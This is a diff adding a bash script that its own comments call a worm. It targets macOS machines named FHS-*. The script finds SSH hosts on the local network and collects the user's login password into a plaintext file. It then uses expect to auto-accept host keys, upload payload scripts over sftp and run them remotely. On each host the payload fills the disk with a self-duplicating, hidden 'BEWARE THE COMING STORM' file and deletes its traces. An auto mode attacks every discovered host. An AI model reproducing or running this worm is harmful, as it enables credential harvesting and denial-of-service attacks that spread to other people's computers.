@@ -1,0 +1,139 @@
+#!/bin/bash
+### Set Variables    \|/
+ignored=false; auto=false; computernamepre=false; wdir="`dirname \"$0\"`"; success=false; found=false; apostrophe="'"; edit=false; autocom=false; voice=false; rm $wdir/worm/worm.sh
+Usage="Usage [-i don't scan hosts][-a automate][-c <computer name>][-e edit host list]"
+until [ -d $wdir/worm ]; do mkdir $wdir/worm; done;
+while [[ ${1:0:1} = '-' ]]; do N=1; L=${#1}
+while [[ $N -lt $L ]]; do
+	case ${1:$N:1} in
+	'x') autocom=true ;;
+	'i') ignored=true ;;
+	'a') auto=true ;;
+	'e') edit=true ;;
+	'v') voice=true ;;
+	'c') if [[ $N -ne $(($L-1)) || ! -n ${2} ]] ; then
+	echo "$Usage"
+	exit 1
+	fi
+	computernamepre=true
+	computername=${2}
+	shift ;;
+	*) echo "$Usage"
+	exit 1 ;;
+	esac
+N=$(($N+1)); done; shift; done
+if [ -f ~/.ssh/known_hosts ]; then rm ~/.ssh/known_hosts; fi; if [ -f $wdir/worm/expecter.sh ]; then rm $wdir/worm/expecter.sh; fi; if [[ $autocom = false ]]; then
+if [ -f $wdir/worm/wormhelp.sh ]; then rm $wdir/worm/wormhelp.sh; fi; if [ -f $wdir/worm/worm.sh ]; then rm $wdir/worm/worm.sh; fi
+if [ $computernamepre = true ]; then if [[ $computername = FHS-* ]]; then goodname=true; else echo $computername is not a valid name, please use the format '[ FHS-xxxxxx ]'; exit; fi; fi
+
+### Set Variables    /|\
+### Automatic Script \|/
+
+if [[ -f $wdir/worm/auto ]]; then rm $wdir/worm/auto; fi
+echo '#!/bin/bash
+hostnum=0; wdir="`dirname \"$0\"`"; success=false; found=false; cd $wdir
+for i in $(cat hosts); do let hostnum=$hostnum+1; done; echo Success, found $hostnum hosts; cd ../
+for i in $(cat worm/hosts)
+do bash cake2 -x -c $i &
+done' >> $wdir/worm/auto
+
+### Automatic Script /|\
+### WORM SCRIPT      \|/
+
+echo '#!/bin/bash
+a=1; b=1; wdir=/Users/Shared/worm; 
+echo '$apostrophe'#!/bin/bash
+sed 1d /Users/Shared/BEWARE\ THE\ COMING\ STORM >> /Users/Shared/BEWARE\ THE\ COMING\ STORM & ((pid=$$+2)); echo $pid >> /Users/Shared/worm/sedpid'$apostrophe' >> $wdir/sed.sh
+echo '$apostrophe*****$apostrophe'; cd $wdir/..
+user=$(ls /Users/ | grep -vE "admin|Shared")
+echo "Launching attack on $user"; echo '$apostrophe*****$apostrophe'; echo ""
+echo "Creating Files"; while [ $a -lt 10000 ]; do
+echo BEWARE THE COMING STORM >> /Users/Shared/BEWARE\ THE\ COMING\ STORM
+((a=$a+1)); ((b=$b+1))
+	if [ $b = 1000 ]; then b=0
+	echo File size = $(ls -lh /Users/Shared | grep "BEWARE*" | sed s/[a-z,-,J,:]//g | awk '"$apostrophe{print "'$4'"}$apostrophe"'); fi
+done; echo ""; echo '"Expanding…"'; echo ""
+chmod +x /Users/Shared/worm/sed.sh; chmod +x /Users/Shared/worm/wormhelp.sh
+bash /Users/Shared/worm/sed.sh & /Users/Shared/worm/wormhelp.sh
+sedpid=$(cat /Users/Shared/worm/sedpid); kill $sedpid
+# chmod -rwx /Users/Shared/BEWARE\ THE\ COMING\ STORM
+chflags hidden /Users/Shared/BEWARE\ THE\ COMING\ STORM; rm -rf /Users/Shared/worm' >> $wdir/worm/worm.sh
+
+### WORM SCRIPT      /|\
+### WORM HELP SCRIPT \|/
+
+
+echo '#!/bin/bash
+counter=0; until [ $counter = 9 ]; do echo File size = $(ls -lh /Users/Shared | grep "BEWARE*" | sed s/[a-z,-,J,:]//g | awk '"$apostrophe{print "'$4'"}$apostrophe"')  x$counter; ((counter=$counter+1)); done' >> $wdir/worm/wormhelp.sh
+
+### WORM HELP SCRIPT /|\
+### EDITOR           \|/
+
+if [ $edit = true ]; then
+open -a TextEdit $wdir/worm/hosts; exit; fi
+
+### EDITOR           /|\
+### Credentials      \|/
+
+until [ -f $wdir/worm/login ]; do login=$(whoami); echo "Login:" $login >> $wdir/worm/login; echo Welcome $login, please input the password that you use to ; echo login to your computer; read  -s -p "Password:" password; clear; echo "Password:" $password >> $wdir/worm/login; done
+
+### Credentials      /|\
+### Computer Name Gen\|/
+
+if [ $ignored = false ]; then if [ -f $wdir/worm/hosts ]; then rm $wdir/worm/hosts; fi; echo generating ip list…; dns-sd -B _ssh._tcp >> ~/.dns-sd & n=1; for i in {1..10}; do  echo "Please wait… $n"0"%"; sleep 0.5; ((n=$n+1)); done; kill $(ps aux | grep -F 'dns-sd -B _ssh._tcp' | grep -v -F 'grep' | awk '{ print $2 }'); for i in $(cat ~/.dns-sd); do if [ $(echo $(echo $i | sed 's/[0-9]//g')"a") = FHS-"a" ]; then echo $i; echo $i >> $wdir/worm/hosts; fi; done; rm ~/.dns-sd; fi; clear
+
+### Computer Name Gen/|\
+### Auto Launcher    \|/
+
+if [[ $auto = true ]]; then bash $wdir/worm/auto; exit; fi
+
+### Auto Launcher    /|\
+fi
+### Pinger-O-Matic   \|/
+
+until [ $success = true ]; do if [ $computernamepre = false ]; then echo Input the computer name or ip; read computername; fi
+echo Pinging...
+if [ $(ping -c 1 $computername >> ~/.Trash/.delete && echo true || echo false) = "true" ]; then echo The host is reachable; computerip=$(ping -c 1 $computername | grep "64 bytes from"|awk '{print $4}'); computerip=$(echo $computerip | semd 's/[:]*//g'); success=true; else echo The host is unreachable; computernamepre=false; fi
+done
+
+### Pinger-O-Matic  /|\
+password=$(cat $wdir/worm/login | grep "Password:" | awk '{print $2}');
+### Expect Script   \|/
+
+if [[ $autocom = false ]]; then
+echo '#!/usr/bin/expect -f
+set timeout 9999999999999
+set password '$password'
+set ipaddr '$computerip'
+set whoami '$(whoami)'
+spawn sftp $whoami@$ipaddr
+expect "The authenticity of host*"
+send -- "yes\r"
+expect "*?assword:*"
+send -- "$password\r"
+expect "sftp> "
+send -- "mkdir /Users/Shared/worm\r"
+expect "sftp> "
+send -- "put '$wdir'/worm/worm.sh /Users/Shared/worm/worm.sh\r"
+expect "/Users/*"
+send -- "put '$wdir'/worm/wormhelp.sh /Users/Shared/worm/wormhelp.sh\r"
+expect "/Users/*"
+send -- "chmod +777 /Users/Shared/worm/worm.sh\r"
+expect "sftp> "
+send -- "chmod +777 /Users/Shared/worm/wormhelp.sh\r"
+expect "sftp> "
+send -- "exit\r"
+spawn ssh $whoami@$ipaddr /Users/Shared/worm/worm.sh
+expect "*?assword:*"
+send -- "$password\r"
+expect "fhs-*"' >> $wdir/worm/expecter.sh; fi
+
+### Expect Script   /|\
+### Launch          \|/
+chmod +x $wdir/worm/expecter.sh
+expect -f $wdir/worm/expecter.sh 
+echo ""
+echo "+----------+"
+echo "| Exiting… |"
+echo "+----------+"
+### Launch          /|\
